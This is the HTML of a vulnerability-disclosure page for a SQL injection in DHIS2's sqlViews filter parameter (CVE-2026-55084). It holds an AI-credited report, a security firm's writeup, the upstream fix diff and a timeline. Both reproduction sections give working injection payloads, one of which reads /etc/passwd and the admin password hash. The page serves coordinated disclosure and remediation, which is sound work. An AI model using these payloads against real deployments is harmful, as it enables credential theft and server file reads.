@@ -1,0 +1,446 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-FW0V6SAJ · dhis2/dhis2-core</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-FW0V6SAJ · dhis2/dhis2-core</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  query-injection
+  <span class="sev-badge sev-high">high</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-55084">CVE-2026-55084</a>
+  <a class="id-badge" href="https://github.com/dhis2/dhis2-core/security/advisories/GHSA-pwmg-mvjw-4m23">GHSA-pwmg-mvjw-4m23</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-unknown">-</span></span>
+</p>
+
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ophion Security.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-FW0V6SAJ: SQL Injection via Unquoted Column Name in SqlView Filter Parameter</h1>
+<p>The /api/sqlViews/{uid}/data endpoint accepts a filter parameter of the form columnName:operator:value. In DefaultSqlViewService.getFilterQuery(), the columnName portion is concatenated raw into the SQL string, while only the operator's value is parameterized. Existing sanitization (ILLEGAL_KEYWORDS, QUERY_NAME_REGEX, SqlUtils.quote()) covers stored query text, criteria keys, and select fields, but not the runtime filter column name. An authenticated user with read access to any SqlView can therefore inject arbitrary SQL, e.g. a UNION SELECT, into the query executed by jdbcTemplate.queryForRowSet(). This allows reading arbitrary tables such as userinfo and returning the results in the Grid response.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> <a href="https://github.com/dhis2/dhis2-core">dhis2/dhis2-core</a><br>
+<strong>Commit:</strong> <code>5c98fe9d15b8033f</code><br>
+<strong>Version:</strong> master @ 661c44651367 (as of 2026-04-17)<br>
+<strong>Location:</strong> <code>DefaultSqlViewService.java:262</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>getFilterQuery() builds the clause as <code>filter += sqlHelper.whereAnd() + " " + columnName + " " + operatorWithPlaceholder</code>, where columnName is split[0] taken directly from the user-supplied filter parameter with no regex check, allowlist, or quoting. The resulting string is passed to jdbcTemplate.queryForRowSet(sql, args) in HibernateSqlViewStore.populateSqlViewGrid(), so attacker-controlled SQL executes verbatim.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Identify any SqlView {uid} the user can read.</li>
+<li>Send GET /api/sqlViews/{uid}/data?filter=1%3D1%20UNION%20SELECT%20username%2Cpassword%20FROM%20userinfo--:eq:x</li>
+<li>The column name '1=1 UNION SELECT username,password FROM userinfo--' is concatenated into the WHERE clause; '--' comments out the remainder of the generated SQL.</li>
+<li>Read the injected userinfo rows from the returned Grid response.</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Suggested Fix</h2>
+<p>Apply SqlUtils.quote() to the column name in getFilterQuery(), consistent with getCriteriaSqlClause() and parseSelectFields(), or validate the column name against the actual columns of the SQL view's result set before building the query.</p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-FW0V6SAJ.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-FW0V6SAJ<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Ophion Security. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h1>[dhis2-core] - SQL Injection via Unquoted Column Name in SqlView Filter Parameter</h1>
+<p><strong>Product:DHIS2-Core</strong>
+<strong>Affected versions:2.44-SNAPSHOT</strong>
+<strong>Tested on:2.44-SNAPSHOT</strong></p>
+<p>Severity: High</p>
+<p>CVSS3.1: <code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H</code></p>
+<h2>CVSS Reasoning</h2>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Value</th>
+<th>Response</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attack Vector</td>
+<td>Network</td>
+<td>Dashboard is accessed remotely via the application's web interface.</td>
+</tr>
+<tr>
+<td>Attack Complexity</td>
+<td>High</td>
+<td>Exploitation depends on the target deployment having at least one SQL-view dashboard configured — a target-specific condition outside the attacker's control. A low-privilege user on a deployment without configured dashboards cannot exploit this, and the attacker cannot force one into existence.</td>
+</tr>
+<tr>
+<td>Privilege Required</td>
+<td>Low</td>
+<td>Attacker needs an authenticated low-tier account with access to at least one existing dashboard. Higher-privileged users (owners/admins) have legitimate direct query access and do not need this vulnerability.</td>
+</tr>
+<tr>
+<td>User Interaction</td>
+<td>None</td>
+<td>Attacker executes the injection directly; no other user needs to be involved.</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Changed</td>
+<td><code>pg_read_file()</code> succeeded during testing, demonstrating the database role has <code>pg_read_server_files</code> privileges. This permits reading files outside the application's authorization boundary (host filesystem, system config, secrets), crossing a security authority boundary. RCE was not achieved, suggesting the role lacks superuser status, <code>pg_execute_server_program</code>, and untrusted PL access — but the file-read primitive alone justifies Scope:Changed.</td>
+</tr>
+<tr>
+<td>Confidentiality</td>
+<td>High</td>
+<td>Arbitrary file read on the DB host via <code>pg_read_file()</code>, plus full read access to the database contents.</td>
+</tr>
+<tr>
+<td>Integrity</td>
+<td>High</td>
+<td>SQL injection allows arbitrary modification of any data the DB role can write.</td>
+</tr>
+<tr>
+<td>Availability</td>
+<td>High</td>
+<td>Attacker can drop tables, exhaust resources, or otherwise disrupt the database.</td>
+</tr>
+</tbody>
+</table>
+<h2>Summary</h2>
+<p>A SQL injection vulnerability exists in the <code>/api/sqlViews</code> endpoint of DHIS2 caused by improper sanitization of the <code>filter</code> input parameter. Any authenticated user with access to at least one SQL View dashboard can exploit this to execute arbitrary SQL queries, enabling lateral access to other database tables and local file read on the underlying server.</p>
+<h2>Impact</h2>
+<p>Access to other tables within the database include <code>userinfo</code> and local file read through <code>pg_read_file</code>. </p>
+<p>In the Docker deployment where this was tested, both table access and file read was confirmed. </p>
+<h2>Description</h2>
+<p>The <code>/api/sqlViews/{uid}/data</code> endpoint accepts a <code>filter</code> parameter of the form <code>columnName:operator:value</code>. In <code>DefaultSqlViewService.getFilterQuery()</code>, the <code>columnName</code> portion is concatenated raw into the SQL string, while only the operator's value is parameterized. Existing sanitization (ILLEGAL_KEYWORDS, QUERY_NAME_REGEX, SqlUtils.quote()) covers stored query text, criteria keys, and select fields, but not the runtime filter column name. An authenticated user with read access to any SqlView can therefore inject arbitrary SQL, e.g. a UNION SELECT, into the query executed by jdbcTemplate.queryForRowSet(). This allows reading arbitrary tables such as <code>userinfo</code>. </p>
+<p>Additionally, the default deployment allows database user to execute as super user allowing for local file read such as <code>/etc/passwd</code> file. </p>
+<h2>Reproduction</h2>
+<ol>
+<li>Deploy the Docker config for DHIS2 following the GitHub repository setup.</li>
+<li>Create a low privileged guest user account with <code>Guest</code> privilege with the following authorities set. </li>
+</ol>
+<pre tabindex="0"><code>{
+  &quot;name&quot;: &quot;Guest&quot;,
+  &quot;authorities&quot;: [
+    &quot;M_dhis-web-interpretation&quot;,
+    &quot;M_dhis-web-pivot&quot;,
+    &quot;M_dhis-web-mobile&quot;,
+    &quot;M_dhis-web-data-visualizer&quot;,
+    &quot;M_dhis-web-dashboard&quot;,
+    &quot;M_dhis-web-light&quot;,
+    &quot;M_dhis-web-messaging&quot;,
+    &quot;M_dhis-web-mapping&quot;,
+    &quot;M_dhis-web-visualizer&quot;,
+    &quot;M_dhis-web-maps&quot;
+  ],
+  &quot;access&quot;: {
+    &quot;manage&quot;: true,
+    &quot;write&quot;: true,
+    &quot;read&quot;: true,
+    &quot;update&quot;: true,
+    &quot;delete&quot;: true
+  },
+  &quot;id&quot;: &quot;XS0dNzuZmfH&quot;
+}
+</code></pre>
+<ol>
+<li>By default, the demo instance has a SQL View that can be used for testing. Retrieve the view UID through http://localhost:8080/api/sqlViews endpoint. Copy the UID value. </li>
+<li>Send the following request to get a list of columns and data: <code>api/sqlViews/{UID}/data?var=valueType:STRING</code></li>
+<li>From the response, count the # of headers returned. These are the column counts that are needed. During testing, it was <code>27</code>. </li>
+<li>Send the following request: <code>http://localhost:8080/api/sqlViews/{UID}/data?var=valueType:STRING&amp;filter=1%3d1+UNION+SELECT+1,(SELECT+pg_read_file('/etc/passwd',100,100)),(SELECT+password+FROM+userinfo+WHERE+username='admin'),+(SELECT+email+FROM+userinfo+WHERE+username='admin'),NULL,NULL,NULL,NULL,NULL,NULL,+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,+NULL,CAST(NULL+AS+jsonb),NULL,CAST(NULL+AS+jsonb),+CAST(NULL+AS+jsonb),CAST(NULL+AS+jsonb),CAST(NULL+AS+jsonb)+WHERE+'a':neq:x</code></li>
+<li>If you get <code>ERROR: each UNION query must have the same number of columns\n  Position: 100</code>, add or remove <code>NULL</code> till you get a successful output. </li>
+<li>Successful output will include:</li>
+<li>Content of /etc/passwd</li>
+<li>Password hash of admin user</li>
+<li>Email of admin user</li>
+</ol>
+<h2>Remediation</h2>
+<p>Apply SqlUtils.quote() to the column name in getFilterQuery(), consistent with getCriteriaSqlClause() and parseSelectFields(), or validate the column name against the actual columns of the SQL view's result set before building the query.</p>
+<p>-&gt; CVD Recommendation: Report</p>
+<p>-&gt; Anthropic discussion:</p></div>
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java b/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java</span>
+<span class="diff-h">index 790b303435ed..aa0c63a80408 100644</span>
+<span class="diff-h">--- a/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java</span>
+<span class="diff-h">+++ b/dhis-2/dhis-services/dhis-service-administration/src/main/java/org/hisp/dhis/sqlview/DefaultSqlViewService.java</span>
+<span class="diff-h">@@ -259,7 +259,7 @@ private OperatorWithPlaceHolderAndArg getFilterQuery(</span>
+<span class="diff-c">     filter +=</span>
+<span class="diff-c">         sqlHelper.whereAnd()</span>
+<span class="diff-c">             + &quot; &quot;</span>
+<span class="diff-d">-            + columnName</span>
+<span class="diff-a">+            + SqlUtils.quote(columnName)</span>
+<span class="diff-c">             + &quot; &quot;</span>
+<span class="diff-c">             + operatorWithPlaceHolderAndArg.operatorWithPlaceholder();</span>
+<span class="diff-c"> </span>
+<span class="diff-h">diff --git a/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java b/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java</span>
+<span class="diff-h">index 23bcfc63aed6..9bc63992b3c9 100644</span>
+<span class="diff-h">--- a/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java</span>
+<span class="diff-h">+++ b/dhis-2/dhis-services/dhis-service-core/src/main/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStore.java</span>
+<span class="diff-h">@@ -34,6 +34,8 @@</span>
+<span class="diff-c"> import jakarta.persistence.EntityManager;</span>
+<span class="diff-c"> import java.io.ByteArrayInputStream;</span>
+<span class="diff-c"> import java.io.ByteArrayOutputStream;</span>
+<span class="diff-a">+import java.io.InvalidClassException;</span>
+<span class="diff-a">+import java.io.ObjectInputFilter;</span>
+<span class="diff-c"> import java.io.ObjectInputStream;</span>
+<span class="diff-c"> import java.io.ObjectOutputStream;</span>
+<span class="diff-c"> import java.io.Serializable;</span>
+<span class="diff-h">@@ -56,6 +58,16 @@</span>
+<span class="diff-c"> public class HibernateUserSettingStore extends HibernateNativeStore&lt;UserSetting&gt;</span>
+<span class="diff-c">     implements UserSettingStore {</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+  private static final ObjectInputFilter DESERIALIZATION_FILTER =</span>
+<span class="diff-a">+      ObjectInputFilter.Config.createFilter(</span>
+<span class="diff-a">+          &quot;maxdepth=5;maxrefs=20;maxarray=0;maxbytes=65536;&quot;</span>
+<span class="diff-a">+              + &quot;java.lang.String;java.lang.Boolean;&quot;</span>
+<span class="diff-a">+              + &quot;java.lang.Number;java.lang.Integer;java.lang.Long;&quot;</span>
+<span class="diff-a">+              + &quot;java.lang.Double;java.lang.Float;java.lang.Enum;&quot;</span>
+<span class="diff-a">+              + &quot;java.util.Locale;java.util.Date;&quot;</span>
+<span class="diff-a">+              + &quot;org.hisp.dhis.common.Locale;org.hisp.dhis.common.DisplayProperty;&quot;</span>
+<span class="diff-a">+              + &quot;!*&quot;);</span>
+<span class="diff-a">+</span>
+<span class="diff-c">   public HibernateUserSettingStore(EntityManager em) {</span>
+<span class="diff-c">     super(em, UserSetting.class);</span>
+<span class="diff-c">   }</span>
+<span class="diff-h">@@ -121,30 +133,34 @@ public void deleteAll(@Nonnull String username) {</span>
+<span class="diff-c">   }</span>
+<span class="diff-c"> </span>
+<span class="diff-c">   /**</span>
+<span class="diff-d">-   * ATM values are stored as binary data serialized from {@link java.io.Serializable}. As we are</span>
+<span class="diff-d">-   * only dealing with primitive values they all implement {@link Object#toString()} in a way that</span>
+<span class="diff-d">-   * yields the proper {@link String} form. This is the 1st step in away from storing binary data by</span>
+<span class="diff-d">-   * only using strings outside the store layer. Also, once settings are updated they always are</span>
+<span class="diff-d">-   * {@link String}s just still in their binary form.</span>
+<span class="diff-a">+   * Deserializes a binary-stored user setting value to its String form. After V2_44_8 migration,</span>
+<span class="diff-a">+   * all rows contain serialized Strings. The ObjectInputFilter remains as a safety net against</span>
+<span class="diff-a">+   * unexpected types or tampered data.</span>
+<span class="diff-c">    */</span>
+<span class="diff-d">-  private static String fromBinary(String key, Object value) {</span>
+<span class="diff-a">+  static String fromBinary(String key, Object value) {</span>
+<span class="diff-c">     if (value == null) return &quot;&quot;;</span>
+<span class="diff-c">     if (value instanceof byte[] binary) {</span>
+<span class="diff-c">       try {</span>
+<span class="diff-c">         ByteArrayInputStream bis = new ByteArrayInputStream(binary);</span>
+<span class="diff-c">         ObjectInputStream ois = new ObjectInputStream(bis);</span>
+<span class="diff-a">+        ois.setObjectInputFilter(DESERIALIZATION_FILTER);</span>
+<span class="diff-c">         return Settings.valueOf((Serializable) ois.readObject());</span>
+<span class="diff-a">+      } catch (InvalidClassException ex) {</span>
+<span class="diff-a">+        log.error(</span>
+<span class="diff-a">+            &quot;Deserialization filter rejected class for user setting &#x27;{}&#x27;: {}&quot;,</span>
+<span class="diff-a">+            key,</span>
+<span class="diff-a">+            ex.getMessage());</span>
+<span class="diff-a">+        return &quot;&quot;;</span>
+<span class="diff-c">       } catch (Exception ex) {</span>
+<span class="diff-d">-        log.warn(</span>
+<span class="diff-d">-            &quot;Failed to de-serialize user setting %s from binary representation, using default&quot;</span>
+<span class="diff-d">-                .formatted(key));</span>
+<span class="diff-a">+        log.warn(&quot;Failed to de-serialize user setting &#x27;{}&#x27; from binary, using default&quot;, key);</span>
+<span class="diff-c">         return &quot;&quot;;</span>
+<span class="diff-c">       }</span>
+<span class="diff-c">     }</span>
+<span class="diff-c">     if (value instanceof Serializable s) return Settings.valueOf(s);</span>
+<span class="diff-c">     log.warn(</span>
+<span class="diff-d">-        &quot;Failed to de-serialize user setting %s from unknown source type: %s, using default&quot;</span>
+<span class="diff-d">-            .formatted(key, value.getClass()));</span>
+<span class="diff-a">+        &quot;Failed to de-serialize user setting &#x27;{}&#x27; from unknown source type: {}, using default&quot;,</span>
+<span class="diff-a">+        key,</span>
+<span class="diff-a">+        value.getClass());</span>
+<span class="diff-c">     return &quot;&quot;;</span>
+<span class="diff-c">   }</span>
+<span class="diff-c"> </span>
+<span class="diff-h">diff --git a/dhis-2/dhis-services/dhis-service-core/src/test/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStoreFilterTest.java b/dhis-2/dhis-services/dhis-service-core/src/test/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStoreFilterTest.java</span>
+<span class="diff-c">new file mode 100644</span>
+<span class="diff-h">index 000000000000..ea0cdaf4e05c</span>
+<span class="diff-h">--- /dev/null</span>
+<span class="diff-h">+++ b/dhis-2/dhis-services/dhis-service-core/src/test/java/org/hisp/dhis/user/hibernate/HibernateUserSettingStoreFilterTest.java</span>
+<span class="diff-h">@@ -0,0 +1,103 @@</span>
+<span class="diff-a">+/*</span>
+<span class="diff-a">+ * Copyright (c) 2004-2026, University of Oslo</span>
+<span class="diff-a">+ * All rights reserved.</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * Redistribution and use in source and binary forms, with or without</span>
+<span class="diff-a">+ * modification, are permitted provided that the following conditions are met:</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * 1. Redistributions of source code must retain the above copyright notice, this</span>
+<span class="diff-a">+ * list of conditions and the following disclaimer.</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * 2. Redistributions in binary form must reproduce the above copyright notice,</span>
+<span class="diff-a">+ * this list of conditions and the following disclaimer in the documentation</span>
+<span class="diff-a">+ * and/or other materials provided with the distribution.</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * 3. Neither the name of the copyright holder nor the names of its contributors </span>
+<span class="diff-a">+ * may be used to endorse or promote products derived from this software without</span>
+<span class="diff-a">+ * specific prior written permission.</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot; AND</span>
+<span class="diff-a">+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span>
+<span class="diff-a">+ * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span>
+<span class="diff-a">+ * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR</span>
+<span class="diff-a">+ * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span>
+<span class="diff-a">+ * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;</span>
+<span class="diff-a">+ * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON</span>
+<span class="diff-a">+ * ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT</span>
+<span class="diff-a">+ * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS</span>
+<span class="diff-a">+ * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>
+<span class="diff-a">+ */</span>
+<span class="diff-a">+package org.hisp.dhis.user.hibernate;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+import static org.junit.jupiter.api.Assertions.assertEquals;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+import java.io.ByteArrayOutputStream;</span>
+<span class="diff-a">+import java.io.ObjectOutputStream;</span>
+<span class="diff-a">+import java.io.Serializable;</span>
+<span class="diff-a">+import java.util.Date;</span>
+<span class="diff-a">+import java.util.Locale;</span>
+<span class="diff-a">+import java.util.stream.Stream;</span>
+<span class="diff-a">+import javax.management.BadAttributeValueExpException;</span>
+<span class="diff-a">+import org.hisp.dhis.common.DisplayProperty;</span>
+<span class="diff-a">+import org.junit.jupiter.api.Test;</span>
+<span class="diff-a">+import org.junit.jupiter.params.ParameterizedTest;</span>
+<span class="diff-a">+import org.junit.jupiter.params.provider.Arguments;</span>
+<span class="diff-a">+import org.junit.jupiter.params.provider.MethodSource;</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+/**</span>
+<span class="diff-a">+ * Verifies the {@link java.io.ObjectInputFilter} on {@link</span>
+<span class="diff-a">+ * HibernateUserSettingStore#fromBinary(String, Object)} accepts known safe types and rejects</span>
+<span class="diff-a">+ * potential gadget classes.</span>
+<span class="diff-a">+ *</span>
+<span class="diff-a">+ * @author Morten Svanaes</span>
+<span class="diff-a">+ */</span>
+<span class="diff-a">+class HibernateUserSettingStoreFilterTest {</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+  static Stream&lt;Arguments&gt; allowedTypes() {</span>
+<span class="diff-a">+    return Stream.of(</span>
+<span class="diff-a">+        Arguments.of(&quot;String value&quot;, &quot;hello&quot;, &quot;hello&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;Boolean value&quot;, Boolean.TRUE, &quot;true&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;Integer value&quot;, 42, &quot;42&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;Long value&quot;, 100L, &quot;100&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;Double value&quot;, 3.14, &quot;3.14&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;java.util.Locale&quot;, Locale.FRENCH, &quot;fr&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;java.util.Date&quot;, new Date(1700000000000L), &quot;1700000000000&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;DHIS2 Locale&quot;, org.hisp.dhis.common.Locale.FRENCH, &quot;fr&quot;),</span>
+<span class="diff-a">+        Arguments.of(&quot;DisplayProperty enum&quot;, DisplayProperty.NAME, &quot;NAME&quot;));</span>
+<span class="diff-a">+  }</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+  @Param</span>
+<span class="diff-c">… (truncated)</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/dhis2/dhis2-core/commit/16cbb390a21391cc5f948092f06a52ce69a3274f" rel="noopener noreferrer">https://github.com/dhis2/dhis2-core/commit/16cbb390a21391cc5f948092f06a52ce69a3274f</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-16</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-04</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-06-09</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-08-17</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">68ded1ff1ee7e9e30fd004f1ec1bc8aeafe4c6d0dc6f40776fa19d937fbb76645beff98c9faa848cdeac10cb56957abd740b6f68d3b7846d3c5c9cf93c40babb</p>
+<p class="kicker">Committed 2026-05-07 07:08 UTC</p>
+<p class="kicker">Revealed 2026-08-17 17:47 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-FW0V6SAJ-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-FW0V6SAJ%22%2C%22bug_class%22%3A%22SQL%20Injection%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%225c98fe9d15b8033f%22%2C%22created_at%22%3A%222026-04-17T05%3A20%3A48%2B00%3A00%22%2C%22description%22%3A%22The%20/api/sqlViews/%7Buid%7D/data%20endpoint%20accepts%20a%20filter%20parameter%20of%20the%20form%20columnName%3Aoperator%3Avalue.%20In%20DefaultSqlViewService.getFilterQuery%28%29%2C%20the%20columnName%20portion%20is%20concatenated%20raw%20into%20the%20SQL%20string%2C%20while%20only%20the%20operator%27s%20value%20is%20parameterized.%20Existing%20sanitization%20%28ILLEGAL_KEYWORDS%2C%20QUERY_NAME_REGEX%2C%20SqlUtils.quote%28%29%29%20covers%20stored%20query%20text%2C%20criteria%20keys%2C%20and%20select%20fields%2C%20but%20not%20the%20runtime%20filter%20column%20name.%20An%20authenticated%20user%20with%20read%20access%20to%20any%20SqlView%20can%20therefore%20inject%20arbitrary%20SQL%2C%20e.g.%20a%20UNION%20SELECT%2C%20into%20the%20query%20executed%20by%20jdbcTemplate.queryForRowSet%28%29.%20This%20allows%20reading%20arbitrary%20tables%20such%20as%20userinfo%20and%20returning%20the%20results%20in%20the%20Grid%20response.%22%2C%22discovered_at%22%3A%222026-04-16T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22DefaultSqlViewService.java%3A262%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22dhis2-core%22%2C%22reproduction%22%3A%5B%221.%20Identify%20any%20SqlView%20%7Buid%7D%20the%20user%20can%20read.%22%2C%222.%20Send%20GET%20/api/sqlViews/%7Buid%7D/data%3Ffilter%3D1%253D1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520userinfo--%3Aeq%3Ax%22%2C%223.%20The%20column%20name%20%271%3D1%20UNION%20SELECT%20username%2Cpassword%20FROM%20userinfo--%27%20is%20concatenated%20into%20the%20WHERE%20clause%3B%20%27--%27%20comments%20out%20the%20remainder%20of%20the%20generated%20SQL.%22%2C%224.%20Read%20the%20injected%20userinfo%20rows%20from%20the%20returned%20Grid%20response.%22%5D%2C%22technical_details%22%3A%22getFilterQuery%28%29%20builds%20the%20clause%20as%20%60filter%20%2B%3D%20sqlHelper.whereAnd%28%29%20%2B%20%5C%22%20%5C%22%20%2B%20columnName%20%2B%20%5C%22%20%5C%22%20%2B%20operatorWithPlaceholder%60%2C%20where%20columnName%20is%20split%5B0%5D%20taken%20directly%20from%20the%20user-supplied%20filter%20parameter%20with%20no%20regex%20check%2C%20allowlist%2C%20or%20quoting.%20The%20resulting%20string%20is%20passed%20to%20jdbcTemplate.queryForRowSet%28sql%2C%20args%29%20in%20HibernateSqlViewStore.populateSqlViewGrid%28%29%2C%20so%20attacker-controlled%20SQL%20executes%20verbatim.%22%2C%22title%22%3A%22SQL%20Injection%20via%20Unquoted%20Column%20Name%20in%20SqlView%20Filter%20Parameter%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-FW0V6SAJ&#34;,
+  &#34;bug_class&#34;: &#34;SQL Injection&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: &#34;5c98fe9d15b8033f&#34;,
+  &#34;created_at&#34;: &#34;2026-04-17T05:20:48+00:00&#34;,
+  &#34;description&#34;: &#34;The /api/sqlViews/{uid}/data endpoint accepts a filter parameter of the form columnName:operator:value. In DefaultSqlViewService.getFilterQuery(), the columnName portion is concatenated raw into the SQL string, while only the operator&#39;s value is parameterized. Existing sanitization (ILLEGAL_KEYWORDS, QUERY_NAME_REGEX, SqlUtils.quote()) covers stored query text, criteria keys, and select fields, but not the runtime filter column name. An authenticated user with read access to any SqlView can therefore inject arbitrary SQL, e.g. a UNION SELECT, into the query executed by jdbcTemplate.queryForRowSet(). This allows reading arbitrary tables such as userinfo and returning the results in the Grid response.&#34;,
+  &#34;discovered_at&#34;: &#34;2026-04-16T00:00:00+00:00&#34;,
+  &#34;location&#34;: &#34;DefaultSqlViewService.java:262&#34;,
